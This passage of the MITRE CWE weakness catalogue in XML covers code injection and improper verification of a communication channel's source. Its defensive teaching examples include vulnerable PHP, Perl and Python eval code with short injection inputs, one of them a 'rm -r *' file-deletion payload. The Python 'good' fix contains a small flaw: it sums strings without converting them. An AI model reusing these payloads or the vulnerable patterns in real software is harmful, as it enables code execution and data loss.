                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>To reduce the likelihood of code injection, use stringent allowlists that limit which constructs are allowed. If you are dynamically constructing code that invokes a function, then verifying that the input is alphanumeric might be insufficient. An attacker might still be able to reference a dangerous function that you did not intend to allow, such as system(), exec(), or exit().</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-32">
               <Phase>Operation</Phase>
               <Strategy>Compilation or Build Hardening</Strategy>
               <Description>Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-32">
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-32">
               <Intro_Text>This example attempts to write user messages to a message file and allow users to view them.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$MessageFile = "messages.out";<xhtml:br/>if ($_GET["action"] == "NewMessage") {<xhtml:div style="margin-left:1em;">$name = $_GET["name"];<xhtml:br/>$message = $_GET["message"];<xhtml:br/>$handle = fopen($MessageFile, "a+");<xhtml:br/>fwrite($handle, "&lt;b&gt;$name&lt;/b&gt; says '$message'&lt;hr&gt;\n");<xhtml:br/>fclose($handle);<xhtml:br/>echo "Message Saved!&lt;p&gt;\n";</xhtml:div>}<xhtml:br/>else if ($_GET["action"] == "ViewMessages") {<xhtml:div style="margin-left:1em;">include($MessageFile);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>While the programmer intends for the MessageFile to only include data, an attacker can provide a message such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>name=h4x0r<xhtml:br/>message=%3C?php%20system(%22/bin/ls%20-l%22);?%3E</xhtml:div>
               </Example_Code>
               <Body_Text>which will decode to the following:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>&lt;?php system("/bin/ls -l");?&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer thought they were just including the contents of a regular data file, but PHP parsed it and executed the code. Now, this code is executed any time people view messages.</Body_Text>
               <Body_Text>Notice that XSS (CWE-79) is also possible in this situation.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-31">
               <Intro_Text>edit-config.pl: This CGI script is used to modify settings in a configuration file.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>use CGI qw(:standard);<xhtml:br/>
                     <xhtml:br/>sub config_file_add_key {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>my ($fname, $key, $arg) = @_;<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># code to add a field/key to a file goes here</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>sub config_file_set_key {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>my ($fname, $key, $arg) = @_;<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># code to set key to a particular file goes here</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>sub config_file_delete_key {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>my ($fname, $key, $arg) = @_;<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># code to delete key from a particular file goes here</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>sub handleConfigAction {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>my ($fname, $action) = @_;<xhtml:br/>my $key = param('key');<xhtml:br/>my $val = param('val');<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># this is super-efficient code, especially if you have to invoke</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># any one of dozens of different functions!</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>my $code = "config_file_$action_key(\$fname, \$key, \$val);";<xhtml:br/>eval($code);</xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>$configfile = "/home/cwe/config.txt";<xhtml:br/>print header;<xhtml:br/>if (defined(param('action'))) {<xhtml:div style="margin-left:1em;">handleConfigAction($configfile, param('action'));</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:1em;">print "No action specified!\n";</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The script intends to take the 'action' parameter and invoke one of a variety of functions based on the value of that parameter - config_file_add_key(), config_file_set_key(), or config_file_delete_key(). It could set up a conditional to invoke each function separately, but eval() is a powerful way of doing the same thing in fewer lines of code, especially when a large number of functions or variables are involved. Unfortunately, in this case, the attacker can provide other values in the action parameter, such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>add_key(",","); system("/bin/ls");</xhtml:div>
               </Example_Code>
               <Body_Text>This would produce the following string in handleConfigAction():</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>config_file_add_key(",","); system("/bin/ls");</xhtml:div>
               </Example_Code>
               <Body_Text>Any arbitrary Perl code could be added after the attacker has "closed off" the construction of the original function call, in order to prevent parsing errors from causing the malicious eval() to fail before the attacker's payload is activated. This particular manipulation would fail after the system() call, because the "_key(\$fname, \$key, \$val)" portion of the string would cause an error, but this is irrelevant to the attack because the payload has already been activated.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-156">
              <Intro_Text>This simple script asks a user to supply a list of numbers as input and adds them together.</Intro_Text>
              <Example_Code Nature="Bad" Language="Python">
                <xhtml:div>
                  def main():<xhtml:br/>
                  <xhtml:div style="margin-left:1em;">
                    sum = 0<xhtml:br/>
                    numbers = eval(input("Enter a space-separated list of numbers: "))<xhtml:br/>
                    for num in numbers:<xhtml:br/>
                    <xhtml:div style="margin-left:1em;">
                      sum = sum + num<xhtml:br/>
                    </xhtml:div>
                    print(f"Sum of {numbers} = {sum}")
                  </xhtml:div>
                  main()
                </xhtml:div>
              </Example_Code>
              <Body_Text>The eval() function can take the user-supplied list and convert it into a Python list object, therefore allowing the programmer to use list comprehension methods to work with the data. However, if code is supplied to the eval() function, it will execute that code. For example, a malicious user could supply the following string:</Body_Text>
              <Example_Code Nature="Attack">
                <xhtml:div>__import__('subprocess').getoutput('rm -r *')</xhtml:div>
              </Example_Code>
              <Body_Text>This would delete all the files in the current directory. For this reason, it is not recommended to use eval() with untrusted input.</Body_Text>
	      <Body_Text>A way to accomplish this without the use of eval() is to apply an integer conversion on the input within a try/except block. If the user-supplied input is not numeric, this will raise a ValueError. By avoiding eval(), there is no opportunity for the input string to be executed as code.</Body_Text>
              <Example_Code Nature="Good" Language="Python">
                <xhtml:div>
                  def main():<xhtml:br/>
                  <xhtml:div style="margin-left:1em;">
                    sum = 0<xhtml:br/>
                    numbers = input("Enter a space-separated list of numbers: ").split(" ")<xhtml:br/>
                    try:<xhtml:br/>
                    <xhtml:div style="margin-left:1em;">
                      for num in numbers:<xhtml:br/>
                      <xhtml:div style="margin-left:1em;">
                        sum = sum + num<xhtml:br/>
                      </xhtml:div>
                      print(f"Sum of {numbers} = {sum}")
                    </xhtml:div>
                    except ValueError:<xhtml:br/>
                    <xhtml:div style="margin-left:1em;">
                      print("Error: invalid input")<xhtml:br/>
                    </xhtml:div>
                  </xhtml:div>
                  main()
                </xhtml:div>
              </Example_Code>
              <Body_Text>An alternative option is to use the ast.literal_eval() function from Python's ast module. This function considers only Python literals as valid data types and will not execute any code contained within the user input.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-2054</Reference>
               <Description>Python compiler uses eval() to execute malicious strings as Python code.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-2054</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-22204</Reference>
               <Description>Chain: regex in EXIF processor code does not correctly determine where a string ends (CWE-625), enabling eval injection (CWE-95), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-22204</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-8218</Reference>
               <Description>"Code injection" in VPN product, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-8218</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5071</Reference>
               <Description>Eval injection in PHP program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5071</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1750</Reference>
               <Description>Eval injection in Perl program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1750</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5305</Reference>
               <Description>Eval injection in Perl program using an ID that should only contain hyphens and numbers.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5305</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1752</Reference>
               <Description>Direct code injection into Perl eval function.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1752</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1753</Reference>
               <Description>Eval injection in Perl program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1753</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1527</Reference>
               <Description>Direct code injection into Perl eval function.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1527</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2837</Reference>
               <Description>Direct code injection into Perl eval function.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2837</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1921</Reference>
               <Description>MFV. code injection into PHP eval statement using nested constructs that should not be nested.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1921</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2498</Reference>
               <Description>MFV. code injection into PHP eval statement using nested constructs that should not be nested.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2498</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3302</Reference>
               <Description>Code injection into Python eval statement from a field in a formatted file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3302</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-1253</Reference>
               <Description>Eval injection in Python program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-1253</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1471</Reference>
               <Description>chain: Resultant eval injection. An invalid value prevents initialization of variables, which can be modified by attacker and later injected into PHP eval statement.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1471</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0495</Reference>
               <Description>Perl code directly injected into CGI library file from parameters to another CGI program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0495</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1876</Reference>
               <Description>Direct PHP code injection into supporting template file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1876</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1894</Reference>
               <Description>Direct code injection into PHP script that can be accessed by attacker.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1894</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0395</Reference>
               <Description>PHP code from User-Agent HTTP header directly inserted into log file implemented as PHP script.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0395</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_ID>CODE</Entry_ID>
               <Entry_Name>Code Evaluation and Injection</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="242"/>
            <Related_Attack_Pattern CAPEC_ID="35"/>
            <Related_Attack_Pattern CAPEC_ID="77"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 3: Web-Client Related Vulnerabilities (XSS).&#34; Page 63"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Relationships, Research_Gaps, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Name, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Research_Gaps</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description, Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-01-12">Code Injection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Control Generation of Code (aka 'Code Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2011-03-29">Failure to Control Generation of Code ('Code Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="940" Name="Improper Verification of Source of a Communication Channel" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product establishes a communication channel to handle an incoming request that has been initiated by an actor, but it does not properly verify that the request is coming from the expected origin.</Description>
         <Extended_Description>When an attacker can successfully establish a communication channel from an untrusted origin, the attacker may be able to gain privileges and access unexpected functionality.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="923" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Mobile" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Other</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Varies by Context</Impact>
               <Note>An attacker can access any functionality that is inadvertently accessible to the source.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Use a mechanism that can validate the identity of the source, such as a certificate, and validate the integrity of data to ensure that it cannot be modified in transit using an Adversary-in-the-Middle (AITM) attack.</xhtml:p>
                  <xhtml:p>When designing functionality of actions in the URL scheme, consider whether the action should be accessible to all mobile applications, or if an allowlist of applications to interface with is appropriate.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-112">
               <Intro_Text>This Android application will remove a user account when it receives an intent to do so:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>IntentFilter filter = new IntentFilter("com.example.RemoveUser");<xhtml:br/>MyReceiver receiver = new MyReceiver();<xhtml:br/>registerReceiver(receiver, filter);<xhtml:br/>
                     <xhtml:br/>public class DeleteReceiver extends BroadcastReceiver {<xhtml:div style="margin-left:1em;">@Override<xhtml:br/>public void onReceive(Context context, Intent intent) {<xhtml:div style="margin-left:1em;">int userID = intent.getIntExtra("userID");<xhtml:br/>destroyUserData(userID);</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This application does not check the origin of the intent, thus allowing any malicious application to remove a user. Always check the origin of an intent, or create an allowlist of trusted applications using the manifest.xml file.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-109">
               <Intro_Text>These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>
                     <xhtml:i>// Android</xhtml:i>
                     <xhtml:br/>@Override<xhtml:br/>public boolean shouldOverrideUrlLoading(WebView view, String url){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if (url.substring(0,14).equalsIgnoreCase("examplescheme:")){<xhtml:div style="margin-left:1em;">if(url.substring(14,25).equalsIgnoreCase("getUserInfo")){<xhtml:div style="margin-left:1em;">writeDataToView(view, UserData);<xhtml:br/>return false;</xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:1em;">return true;</xhtml:div>}</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Objective-C">
                  <xhtml:div>
                     <xhtml:i>// iOS</xhtml:i>
                     <xhtml:br/>-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType<xhtml:br/>{<xhtml:div style="margin-left:1em;">
                        <xhtml:div>NSURL *URL = [exRequest URL];<xhtml:br/>if ([[URL scheme] isEqualToString:@"exampleScheme"])<xhtml:br/>{<xhtml:div style="margin-left:1em;">
                              <xhtml:div>NSString *functionString = [URL resourceSpecifier];<xhtml:br/>if ([functionString hasPrefix:@"specialFunction"])<xhtml:br/>{<xhtml:div style="margin-left:1em;">
                                    <xhtml:div>
                                       <xhtml:br/>
                                       <xhtml:i>// Make data available back in webview.</xhtml:i>
                                       <xhtml:br/>UIWebView *webView = [self writeDataToView:[URL query]];</xhtml:div>
                                 </xhtml:div>}<xhtml:br/>return NO;</xhtml:div>
                           </xhtml:div>}<xhtml:br/>return YES;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>A call into native code can then be initiated by passing parameters within the URL:</Body_Text>
               <Example_Code Nature="Attack" Language="JavaScript">
                  <xhtml:div>window.location = examplescheme://method?parameter=value</xhtml:div>
               </Example_Code>
               <Body_Text>Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2000-1218</Reference>
               <Description>DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-1218</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0877</Reference>
               <Description>DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0877</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1452</Reference>
               <Description>DNS server caches glue records received from non-delegated name servers</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1452</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="500"/>
            <Related_Attack_Pattern CAPEC_ID="594"/>
            <Related_Attack_Pattern CAPEC_ID="595"/>
            <Related_Attack_Pattern CAPEC_ID="596"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-324"/>
         </References>
         <Notes>
            <Note Type="Relationship">While many access control issues involve authenticating the user, this weakness is more about authenticating the actual source of the communication channel itself; there might not be any "user" in such cases.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2014-02-13</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Related_Attack_Patterns</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="942" Name="Permissive Cross-domain Policy with Untrusted Domains" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The product uses a cross-domain policy file that includes domains that should not be trusted.</Description>
         <Extended_Description>
